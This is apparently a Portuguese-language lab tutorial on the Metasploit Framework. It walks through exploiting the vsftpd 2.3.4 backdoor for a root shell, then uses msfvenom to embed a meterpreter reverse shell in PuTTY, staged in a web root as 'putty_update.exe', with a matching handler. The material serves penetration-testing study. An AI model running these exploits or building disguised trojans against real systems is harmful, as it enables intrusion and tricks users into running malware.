💣 Exploração de Vulnerabilidades com Metasploit Framework

Conceito Fundamental: Na cibersegurança ofensiva, o analista nunca adivinha comandos aleatórios. A exploração é o resultado de uma linha investigativa contínua: Varredura (Nmap -sV) ➔ Identificação do Software e Versão Exata ➔ Pesquisa de Falhas (Search) ➔ Configuração no Metasploit ➔ Execução do Exploit.

1. O Fluxo de Trabalho: Da Varredura até o Exploit

[1. NMAP -sV] ────────► [2. PESQUISA] ────────► [3. METASPLOIT] ────────► [4. EXPLOIT]
Lê a porta, o software   Busca se a versão      Carrega o módulo         Entrega o payload e
e a versão exata         tem CVE/falha          e ajusta RHOSTS/LHOST    ganha acesso (Shell)

2. O Ciclo Padrão de Comandos no msfconsole

# 1. Carregar o módulo escolhido
use exploit/unix/ftp/vsftpd_234_backdoor

# 2. Inspecionar parâmetros obrigatórios
show options

# 3. Definir o IP do Alvo (RHOSTS = Remote Host)
set RHOSTS 192.168.56.102

# 4. Definir o IP da sua máquina atacante (LHOST = Local Host)
set LHOST 192.168.56.101

# 5. Disparar a exploração
exploit

3. Laboratórios Práticos Demonstrados

Caso 1: Exploração do vsftpd 2.3.4 (Backdoor Histórica)

O software continha uma backdoor intencional: ao tentar autenticar com um username terminando em :), o daemon abria a porta 6200/TCP com shell root direto.

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
exploit
# Pós-acesso: id ➔ uid=0(root)

Caso 2: Geração de Trojan com Msfvenom e Handler

Injeção de uma Reverse Shell em um executável legítimo (PuTTY) preservando sua funcionalidade original com o parâmetro -k:

# Geração do binário:
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 \
  LPORT=4444 \
  -x /root/Downloads/putty.exe \
  -k \
  -f exe \
  -o /var/www/html/putty_update.exe

# Listener no Metasploit:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
exploit

4. Guia Rápido de Solução de Problemas em Laboratório

Problema Comum Causa Real Como Resolver
Exploit failed: Connection refused A versão do serviço no alvo não é exatamente a vulnerável. Confirme no Nmap se a versão do daemon é idêntica ao exploit.
O executável roda mas a shell não abre LHOST configurado com IP errado (ex: loopback ou IP do alvo). Defina LHOST exatamente com o IP da interface do seu Kali Linux.
Handler failed to bind A porta de escuta (ex: 4444) já está em uso por outro processo. Troque para outra porta (ex: 5555) em ambos os comandos.
